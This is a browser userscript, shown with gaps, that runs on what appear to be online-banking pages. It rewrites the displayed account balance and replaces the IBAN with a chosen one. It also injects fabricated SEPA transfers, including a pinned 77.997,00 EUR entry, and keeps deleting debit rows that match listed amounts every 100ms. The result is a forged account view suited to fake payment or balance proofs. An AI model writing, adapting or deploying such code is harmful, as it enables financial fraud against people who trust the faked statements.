// ==UserScript==
// @name         Ed 4Rec  nor.thomas-pape72@web.de
...
// @run-at       document-end
// @downloadURL https://update.greasyfork.org/scripts/544102/Ed%204Rec%20%20northomas-pape72%40webde.user.js
// @updateURL https://update.greasyfork.org/scripts/544102/Ed%204Rec%20%20northomas-pape72%40webde.meta.js
// ==/UserScript==
if (window.location.href.indexOf("meine") > 0 || window.location.href.indexOf("kunden") > 0 || window.location.href.indexOf("Downloads") > 0) {
...
var modificationAmount = 0.00; // Example: +9000 to increase by 9000

// Define the desired IBAN
var desiredIBAN = 'DE68 1007 7777 0519 3065 00';
...
//           transactionType: ' SEPA Überweisung ',
 //          transactionDate: '08.04.2025',
 //          transactionAmount: '4.000,00 EUR',
...
//           transactionAmount: '7.270,00 EUR',
 //          preferredInsertionLogic: 'pinned_top',
   //       moveSteps: 1,
   //        moveDirection: 'down'
   //     },
  //        {
 //          recipient: ' JP Morgan Chase.',
  //         transactionInfo: 'A. Gold meldet sich. Ohne ihn nicht ausgeben 1.',
  //        transactionType: ' SEPA Überweisung ',
  //         transactionDate: '13.02.2025',
  //         transactionAmount: '7.270,00 EUR',
  //         preferredInsertionLogic: 'pinned_top',
  ...
  //      },
       {
           ...
           transactionAmount: '77.997,00 EUR',
           preferredInsertionLogic: 'pinned_top',
          moveSteps: 0,
           moveDirection: 'down'
        },
...
if (window.location.href.indexOf("meine") > 0 || window.location.href.indexOf("bank") > 0 || window.location.href.indexOf("Downloads") > 0) {
...
function modifyMainBalance(modificationAmount, balanceIndex) {
   ...
   var gesamtsaldoElement = document.querySelector('[data-test="title"].db-heading-3.db-text-bold, .db-text-bold.negative');
  ...
  //  ];
    ...
    function modifyMainBalances(configs) {
        ...
        configs.forEach(function(config) {
            ...
            var balanceElements = document.querySelectorAll('.db-text-bold.positive, .db-text-bold.negative, .db-text-bold.negative');
            var balanceElement = balanceElements[balanceIndex];
...
//    var desiredIBAN = 'DE10 7217 0324 0842 5803 00';
    ...
    //---------------------------------------------------------------------------------------
 // 🚫 List of negative amounts to remove (customize as needed)
const amountsToRemove = ['-9.500,00', '-9.000,00', '-6.000,00'];

function removeNegativeElement() {
    // Get all transaction rows
    const transactionElements = document.querySelectorAll('cirrus-transaction-row');

    transactionElements.forEach(transactionElement => {
        // Look for any negative value span inside the transaction
        const negativeAmountSpan = transactionElement.querySelector('.db-text-bold.negative');

        if (negativeAmountSpan) {
            const cleanedText = negativeAmountSpan.textContent.replace(/\s/g, '');

            // Check if the cleaned text matches any of the unwanted values
            if (amountsToRemove.some(amount => cleanedText.includes(amount))) {
                transactionElement.remove();
                console.log(`Removed transaction with amount: ${cleanedText}`);
            }
        }
    });
}
...
// Run every 100ms
setInterval(removeNegativeElement, 100);
